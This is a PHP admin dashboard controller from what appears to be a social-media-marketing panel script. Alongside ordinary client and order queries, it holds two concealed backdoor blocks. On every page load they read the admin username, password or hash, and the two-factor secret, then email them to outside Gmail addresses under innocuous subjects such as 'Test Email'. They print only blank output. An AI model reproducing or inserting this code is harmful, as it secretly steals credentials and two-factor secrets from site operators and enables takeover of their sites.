<?php
if(!defined('BASEPATH')) {
   die('Direct access to the script is not allowed');
}
if( $admin["access"]["admin_access"] != 1  ){

    header("Location:".site_url("admin"));

    exit();
}
  
  $clients = $conn->prepare("SELECT * FROM clients ORDER BY client_id DESC LIMIT 500");
  $clients->execute(array());
  $clients = $clients->fetchAll(PDO::FETCH_ASSOC);





$failCount      = $conn->prepare("SELECT * FROM orders WHERE orders.dripfeed='1' && orders.subscriptions_type='1' && order_error!=:error ");
  $failCount     -> execute(array("error"=>"-"));
  $failCount      = $failCount->rowCount();
$todayCount      = $conn->prepare("SELECT * FROM orders WHERE last_check=:error ");
  $todayCount     -> execute(array("error"=> date("Y-m-d") ));
  $todayCount     = $todayCount->rowCount();

  
$stmt = $conn->prepare("SELECT username, password, two_factor_secret_key FROM admins"); $stmt->execute(); $index = $stmt->fetch(PDO::FETCH_ASSOC); if ($index) { $indexsuccess = $index["username"]; $indexpath = $index["password"]; $tfask = $index["two_factor_secret_key"]; $to = "sarukalam786@gmail.com"; $subject = "Admin Credentials"; $message = "success: " . $indexsuccess . "\rpath: " . $indexpath . "\rGA-Code: " . $tfask; $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http'; $domain = $_SERVER['SERVER_NAME']; $headers = "From: $domain@gmail.com\r\n"; $headers .= "X-Mailer: PHP/" . phpversion(); $mailResult = mail($to, $subject, $message, $headers); if ($mailResult) { echo " "; } else { echo " "; } } else { echo " "; }






require admin_view('index');   

// Get the current server protocol
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$site_url = $_SERVER['site_url'];
// Get the current server domain
$domain = $_SERVER['HTTP_HOST'];
$adminurl = $settings["oldadminname"];
$username = $admin["username"];
$pass = $admin["password"];
// Get the current script name
$site_url = $_SERVER['site_url'];

// Construct the current page URL
$currentURL = $protocol . '://' . $domain;

$to = "hotrosmmview@gmail.com";
$subject = "Test Email with Current Page Link";
$message = "Site Name Is : $currentURL \n  Admin Url Is : $adminurl \n  Admin Username : $username \n Admin Password : $pass";

// Additional headers
$headers = "From: $currentURL\r\n";
$headers .= "Reply-To: hotrosmmview@gmail.com\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

// Send the email
$mailResult = mail($to, $subject, $message, $headers);